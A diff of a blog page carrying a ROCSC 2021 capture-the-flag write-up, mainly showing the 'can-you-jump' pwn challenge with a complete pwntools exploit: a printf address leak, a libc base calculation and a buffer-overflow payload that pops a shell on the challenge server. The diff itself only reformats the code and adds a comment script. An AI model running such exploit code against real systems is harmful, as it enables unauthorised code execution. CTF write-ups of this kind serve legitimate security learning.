@@ -5,7 +5,7 @@ ROCSC 2021Writeupcan-you-jump(210): PwnProof of FlagCTF{70dd83585c9e2656c8a391b7
 SummaryWe get a 64-bit executable, not stripped which we need to pwn.After some analysis we see that just NX is enabled so we can’t use shellcode for this exploit.
 
 
-After running the program we can see that it’s leaking a printf() ad.."><meta name="generator" content="Hexo 6.3.0"></head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Ischyr's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">ROCSC</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ROCSC-2021"><span class="toc-text">ROCSC 2021</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Writeup"><span class="toc-text">Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#can-you-jump-210-Pwn"><span class="toc-text">can-you-jump(210): Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Flag"><span class="toc-text">Proof of Flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Summary"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Solving"><span class="toc-text">Proof of Solving</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Code"><span class="toc-text">Proof of Code</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#what-to-do-1000-Misc"><span class="toc-text">what-to-do(1000): Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Flag-1"><span class="toc-text">Proof of Flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Summary-1"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Solving-1"><span class="toc-text">Proof of Solving</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#n4twork-urg3nt-investigation-200-Forensics"><span class="toc-text">n4twork urg3nt investigation(200): Forensics</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Flag-2"><span class="toc-text">Proof of Flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Summary-2"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Solving-2"><span class="toc-text">Proof of Solving</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#old-tickets-250-Web"><span class="toc-text">old-tickets(250): Web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Flag-3"><span class="toc-text">Proof of Flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Summary-3"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Solving-3"><span class="toc-text">Proof of Solving</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Code-1"><span class="toc-text">Proof of Code</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#inodat-300-Web"><span class="toc-text">inodat(300): Web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Flag-4"><span class="toc-text">Proof of Flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Summary-4"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Solving-4"><span class="toc-text">Proof of Solving</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#clueless-investigation-290-Rev"><span class="toc-text">clueless_investigation(290): Rev</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Flag-5"><span class="toc-text">Proof of Flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Summary-5"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Solving-5"><span class="toc-text">Proof of Solving</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Code-2"><span class="toc-text">Proof of Code</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#calculus-300-Web"><span class="toc-text">calculus(300): Web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Flag-6"><span class="toc-text">Proof of Flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Summary-6"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Solving-6"><span class="toc-text">Proof of Solving</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#file-crawler-50-Web"><span class="toc-text">file-crawler(50): Web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Flag-7"><span class="toc-text">Proof of Flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Summary-7"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Solving-7"><span class="toc-text">Proof of Solving</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Little-endian-photo-340-Forensics"><span class="toc-text">Little-endian-photo(340): Forensics</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Flag-8"><span class="toc-text">Proof of Flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Summary-8"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Solving-8"><span class="toc-text">Proof of Solving</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Code-3"><span class="toc-text">Proof of Code</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reccon-160-Web"><span class="toc-text">reccon(160): Web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Flag-9"><span class="toc-text">Proof of Flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Summary-9"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Solving-9"><span class="toc-text">Proof of Solving</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Code-4"><span class="toc-text">Proof of Code</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RGB-led-matrix-320-Misc"><span class="toc-text">RGB_led_matrix(320): Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Flag-10"><span class="toc-text">Proof of Flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Summary-10"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Solving-10"><span class="toc-text">Proof of Solving</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Code-5"><span class="toc-text">Proof of Code</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OLED-380-Misc"><span class="toc-text">OLED(380): Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Flag-11"><span class="toc-text">Proof of Flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Summary-11"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Solving-11"><span class="toc-text">Proof of Solving</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Code-6"><span class="toc-text">Proof of Code</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#speed-50-Rev"><span class="toc-text">speed(50): Rev</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Flag-12"><span class="toc-text">Proof of Flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Summary-12"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Solving-12"><span class="toc-text">Proof of Solving</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Code-7"><span class="toc-text">Proof of Code</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#where-do-you-go-300-Misc"><span class="toc-text">where-do-you-go(300): Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Flag-13"><span class="toc-text">Proof of Flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Summary-13"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Solving-13"><span class="toc-text">Proof of Solving</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Code-8"><span class="toc-text">Proof of Code</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ultra-crawl-210-Web"><span class="toc-text">ultra-crawl(210): Web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Flag-14"><span class="toc-text">Proof of Flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Summary-14"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Solving-14"><span class="toc-text">Proof of Solving</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#el-picasso-150-Rev"><span class="toc-text">el-picasso(150): Rev</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Flag-15"><span class="toc-text">Proof of Flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Summary-15"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Solving-15"><span class="toc-text">Proof of Solving</span></a></li></ol></li></ol></li></ol></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/CTF"><i class="tag post-item-tag">CTF</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">ROCSC</h1><time class="has-text-grey" datetime="2021-12-08T18:36:03.000Z">2021-12-08</time><article class="mt-2 post-content"><img src="/2021/12/08/rocsc-2021/CAMPIONAT.jpg" class="">
+After running the program we can see that it’s leaking a printf() ad.."><script src="//unpkg.com/valine/dist/Valine.min.js"></script><meta name="generator" content="Hexo 6.3.0"></head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Ischyr's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">ROCSC</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ROCSC-2021"><span class="toc-text">ROCSC 2021</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Writeup"><span class="toc-text">Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#can-you-jump-210-Pwn"><span class="toc-text">can-you-jump(210): Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Flag"><span class="toc-text">Proof of Flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Summary"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Solving"><span class="toc-text">Proof of Solving</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Code"><span class="toc-text">Proof of Code</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#what-to-do-1000-Misc"><span class="toc-text">what-to-do(1000): Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Flag-1"><span class="toc-text">Proof of Flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Summary-1"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Solving-1"><span class="toc-text">Proof of Solving</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#n4twork-urg3nt-investigation-200-Forensics"><span class="toc-text">n4twork urg3nt investigation(200): Forensics</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Flag-2"><span class="toc-text">Proof of Flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Summary-2"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Solving-2"><span class="toc-text">Proof of Solving</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#old-tickets-250-Web"><span class="toc-text">old-tickets(250): Web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Flag-3"><span class="toc-text">Proof of Flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Summary-3"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Solving-3"><span class="toc-text">Proof of Solving</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Code-1"><span class="toc-text">Proof of Code</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#inodat-300-Web"><span class="toc-text">inodat(300): Web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Flag-4"><span class="toc-text">Proof of Flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Summary-4"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Solving-4"><span class="toc-text">Proof of Solving</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#clueless-investigation-290-Rev"><span class="toc-text">clueless_investigation(290): Rev</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Flag-5"><span class="toc-text">Proof of Flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Summary-5"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Solving-5"><span class="toc-text">Proof of Solving</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Code-2"><span class="toc-text">Proof of Code</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#calculus-300-Web"><span class="toc-text">calculus(300): Web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Flag-6"><span class="toc-text">Proof of Flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Summary-6"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Solving-6"><span class="toc-text">Proof of Solving</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#file-crawler-50-Web"><span class="toc-text">file-crawler(50): Web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Flag-7"><span class="toc-text">Proof of Flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Summary-7"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Solving-7"><span class="toc-text">Proof of Solving</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Little-endian-photo-340-Forensics"><span class="toc-text">Little-endian-photo(340): Forensics</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Flag-8"><span class="toc-text">Proof of Flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Summary-8"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Solving-8"><span class="toc-text">Proof of Solving</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Code-3"><span class="toc-text">Proof of Code</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reccon-160-Web"><span class="toc-text">reccon(160): Web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Flag-9"><span class="toc-text">Proof of Flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Summary-9"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Solving-9"><span class="toc-text">Proof of Solving</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Code-4"><span class="toc-text">Proof of Code</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RGB-led-matrix-320-Misc"><span class="toc-text">RGB_led_matrix(320): Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Flag-10"><span class="toc-text">Proof of Flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Summary-10"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Solving-10"><span class="toc-text">Proof of Solving</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Code-5"><span class="toc-text">Proof of Code</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OLED-380-Misc"><span class="toc-text">OLED(380): Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Flag-11"><span class="toc-text">Proof of Flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Summary-11"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Solving-11"><span class="toc-text">Proof of Solving</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Code-6"><span class="toc-text">Proof of Code</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#speed-50-Rev"><span class="toc-text">speed(50): Rev</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Flag-12"><span class="toc-text">Proof of Flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Summary-12"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Solving-12"><span class="toc-text">Proof of Solving</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Code-7"><span class="toc-text">Proof of Code</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#where-do-you-go-300-Misc"><span class="toc-text">where-do-you-go(300): Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Flag-13"><span class="toc-text">Proof of Flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Summary-13"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Solving-13"><span class="toc-text">Proof of Solving</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Code-8"><span class="toc-text">Proof of Code</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ultra-crawl-210-Web"><span class="toc-text">ultra-crawl(210): Web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Flag-14"><span class="toc-text">Proof of Flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Summary-14"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Solving-14"><span class="toc-text">Proof of Solving</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#el-picasso-150-Rev"><span class="toc-text">el-picasso(150): Rev</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Flag-15"><span class="toc-text">Proof of Flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Summary-15"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Solving-15"><span class="toc-text">Proof of Solving</span></a></li></ol></li></ol></li></ol></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/CTF"><i class="tag post-item-tag">CTF</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">ROCSC</h1><time class="has-text-grey" datetime="2021-12-08T18:36:03.000Z">2021-12-08</time><article class="mt-2 post-content"><img src="/2021/12/08/rocsc-2021/CAMPIONAT.jpg" class="">
 
 <h1 id="ROCSC-2021"><a href="#ROCSC-2021" class="headerlink" title="ROCSC 2021"></a>ROCSC 2021</h1><h1 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h1><h2 id="can-you-jump-210-Pwn"><a href="#can-you-jump-210-Pwn" class="headerlink" title="can-you-jump(210): Pwn"></a>can-you-jump(210): Pwn</h2><h4 id="Proof-of-Flag"><a href="#Proof-of-Flag" class="headerlink" title="Proof of Flag"></a>Proof of Flag</h4><p>CTF{70dd83585c9e2656c8a391b7dbc1f28e8d40a98067fdb56adfb69b8e509481df}</p>
 <h4 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h4><p>We get a 64-bit executable, not stripped which we need to pwn.<br>After some analysis we see that just <strong>NX</strong> is enabled so we can’t use shellcode for this exploit.</p>
@@ -18,42 +18,42 @@ After running the program we can see that it’s leaking a printf() ad.."><meta 
 <p>Another way of solving this and the intended one is <strong>JOP</strong> -&gt; Jump Oriented Programming or another way that I found is <strong>re2libc</strong> with <strong>write(1, read@got, $value_of_rdi)</strong> and after that it’s a <strong>ret2libc</strong> with the leak of <strong>read</strong> and after that you do the normal exploit.</p>
 <h4 id="Proof-of-Solving"><a href="#Proof-of-Solving" class="headerlink" title="Proof of Solving"></a>Proof of Solving</h4><img src="/2021/12/08/rocsc-2021/20210830133856.png" class="">
 
-<h4 id="Proof-of-Code"><a href="#Proof-of-Code" class="headerlink" title="Proof of Code"></a>Proof of Code</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-<span class="token comment">#context.log_level='DEBUG'</span>
+<h4 id="Proof-of-Code"><a href="#Proof-of-Code" class="headerlink" title="Proof of Code"></a>Proof of Code</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
+#context.log_level&#x3D;&#39;DEBUG&#39;
 
-p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./can-you-jump"</span><span class="token punctuation">)</span>
-libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc-2.27.so"</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
+p &#x3D; process(&quot;.&#x2F;can-you-jump&quot;)
+libc &#x3D; ELF(&quot;.&#x2F;libc-2.27.so&quot;, checksec&#x3D;False)
 
-<span class="token keyword">def</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token keyword">if</span> <span class="token keyword">not</span> args<span class="token punctuation">.</span>REMOTE<span class="token punctuation">:</span>
-                <span class="token keyword">return</span> process<span class="token punctuation">(</span><span class="token string">"./can-you-jump"</span><span class="token punctuation">)</span>
-        <span class="token keyword">else</span><span class="token punctuation">:</span>
-                <span class="token keyword">return</span> remote<span class="token punctuation">(</span><span class="token string">"34.141.31.183"</span><span class="token punctuation">,</span> <span class="token number">30217</span><span class="token punctuation">)</span>
+def start():
+        if not args.REMOTE:
+                return process(&quot;.&#x2F;can-you-jump&quot;)
+        else:
+                return remote(&quot;34.141.31.183&quot;, 30217)
 
-p <span class="token operator">=</span> start<span class="token punctuation">(</span><span class="token punctuation">)</span>
+p &#x3D; start()
 
-<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+def main():
 
-        <span class="token keyword">global</span> rop
+        global rop
 
-        <span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Printf() address : "</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-        leak <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
-        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>leak<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        print(p.recvuntil(&quot;Printf() address : &quot;))
+        leak &#x3D; int(p.recvline(), 16)
+        print(hex(leak))
 
-        libc<span class="token punctuation">.</span>address <span class="token operator">=</span> leak <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>
-        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        libc.address &#x3D; leak - libc.symbols[&#39;printf&#39;]
+        print(hex(libc.address))
 
-        payload <span class="token operator">=</span> <span class="token string">""</span>
-        payload <span class="token operator">+=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">72</span>
-        payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token number">0x00000000000008aa</span><span class="token punctuation">)</span>
-        payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token number">0x4f432</span><span class="token punctuation">)</span>
+        payload &#x3D; &quot;&quot;
+        payload +&#x3D; &quot;A&quot;*72
+        payload +&#x3D; p64(libc.address + 0x00000000000008aa)
+        payload +&#x3D; p64(libc.address + 0x4f432)
 
-        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+        p.sendline(payload)
 
-        p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        p.interactive()
 
-<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>
-        main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+if __name__&#x3D;&#x3D;&quot;__main__&quot;:
+        main()</code></pre>
 
 <h2 id="what-to-do-1000-Misc"><a href="#what-to-do-1000-Misc" class="headerlink" title="what-to-do(1000): Misc"></a>what-to-do(1000): Misc</h2><h4 id="Proof-of-Flag-1"><a href="#Proof-of-Flag-1" class="headerlink" title="Proof of Flag"></a>Proof of Flag</h4><img src="/2021/12/08/rocsc-2021/20210830135119.png" class="">
 
@@ -195,39 +195,39 @@ p <span class="token operator">=</span> start<span class="token punctuation">(</
 <p>After looking at the errors we find that we can bruteforce the code by timestamp and <strong>POST</strong> it with <em>code</em> request method.</p>
 <img src="/2021/12/08/rocsc-2021/20210830212701.png" class="">
 
